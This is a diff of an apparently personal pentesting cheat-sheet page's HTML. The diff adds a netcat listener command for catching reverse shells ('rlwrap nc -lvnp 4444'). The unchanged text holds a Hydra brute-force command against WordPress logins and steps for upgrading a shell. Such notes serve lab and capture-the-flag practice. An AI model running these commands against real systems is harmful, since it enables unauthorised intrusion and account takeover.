@@ -14,7 +14,7 @@
 <meta property="og:description" content="HydraBruteforce WordPresshydra -L users.txt -P passwords.txt &lt;target-ip&gt; -V http-post-form &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In&amp;testcookie&#x3D;1:S&#x3D;Location&quot; St">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-04-24T04:52:00.000Z">
-<meta property="article:modified_time" content="2022-05-03T17:49:57.526Z">
+<meta property="article:modified_time" content="2022-07-06T00:45:06.520Z">
 <meta name="twitter:card" content="summary">
     
     
@@ -98,6 +98,8 @@
       
           <h2 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h2><h3 id="Bruteforce-WordPress"><a href="#Bruteforce-WordPress" class="headerlink" title="Bruteforce WordPress"></a>Bruteforce WordPress</h3><p><code>hydra -L users.txt -P passwords.txt &lt;target-ip&gt; -V http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&quot;</code></p>
 <h2 id="Stabilize-Shell"><a href="#Stabilize-Shell" class="headerlink" title="Stabilize Shell"></a>Stabilize Shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">&lt;ctrl-z&gt;</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line">&lt;enter&gt;</span><br><span class="line">&lt;enter&gt;</span><br><span class="line"></span><br><span class="line">stty -a # To get all information about our local terminal, but for this we just need columns and rows</span><br><span class="line"></span><br><span class="line">stty columns &lt;col_num&gt; rows &lt;row_num&gt; # To set the correct aspect ratio on target machine</span><br></pre></td></tr></table></figure>
+<p>OR just rlwrap nc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -lvnp 4444</span><br></pre></td></tr></table></figure>
         
   </div>
 </article>
